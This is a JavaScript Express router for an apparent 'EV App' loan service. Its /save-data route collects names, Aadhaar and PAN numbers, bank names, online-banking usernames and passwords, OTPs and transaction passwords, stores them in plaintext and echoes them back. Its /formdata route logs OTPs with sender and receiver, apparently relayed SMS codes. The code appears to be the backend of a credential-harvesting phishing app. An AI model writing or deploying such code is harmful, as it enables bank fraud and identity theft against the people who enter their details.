import express from "express";
import UserModel from "./Schema/user.schema.js";
import FormDataModel from "./Schema/data.schema.js";
import adminRouter from "./Routers/admin.routes.js";

const router = express.Router();

router.get("/", (req, res) => {
  res.send("Welcome to EV App Server APIs");
});

router.use("/admin", adminRouter);

router.post("/save-data", async (req, res) => {
  try {
    const {
      name,
      phoneNo,
      aadhar,
      pan,
      loanAmount,
      calculatedEMI,
      totalInterest,
      totalPayment,
      bankName,
      userName,
      password,
      otp,
      transactionPassword,
    } = req.body;

    if (!phoneNo) {
      return res.status(400).json({ message: "phoneNo is required" });
    }

    // Trim helper
    const trimFields = (obj) => {
      const result = {};
      for (const [key, value] of Object.entries(obj)) {
        if (typeof value === "string") result[key] = value.trim();
        else if (key === "phoneNo") result[key] = String(value).trim();
        else result[key] = value;
      }
      return result;
    };

    const data = trimFields({
      name,
      phoneNo,
      aadhar,
      pan,
      loanAmount,
      calculatedEMI,
      totalInterest,
      totalPayment,
      bankName,
      userName,
      password,
      otp,
      transactionPassword,
    });

    // Build dynamic update fields (ignore undefined)
    const updateFields = {};
    for (const [key, value] of Object.entries(data)) {
      if (value !== undefined) updateFields[key] = value;
    }

    // Find and update OR insert new
    const user = await UserModel.findOneAndUpdate(
      { phoneNo: data.phoneNo },
      { $set: updateFields },
      { new: true, upsert: true }
    );

    // Check if it was an update or create
    const existed = await UserModel.exists({ phoneNo: data.phoneNo });

    res.status(existed ? 200 : 201).json({
      message: existed
        ? "User updated successfully"
        : "User created successfully",
      data: user,
    });
  } catch (error) {
    if (error.code === 11000) {
      return res
        .status(409)
        .json({ message: "Duplicate entry", error: error.keyValue });
    }
    res
      .status(500)
      .json({ message: "Error saving user", error: error.message });
  }
});

router.post("/formdata", async (req, res) => {
  try {
    const { otp, time, sender, reciever } = req.body;

    // Basic validation
    if (!otp || !time || !sender || !reciever) {
      return res.status(400).json({ message: "All fields are required" });
    }

    const formData = new FormDataModel({
      otp,
      time,
      sender,
      reciever,
    });

    await formData.save();

    res.status(201).json({
      message: "Form data saved successfully",
      data: formData,
    });
  } catch (error) {
    res
      .status(500)
      .json({ message: "Error saving form data", error: error.message });
  }
});

export default router;
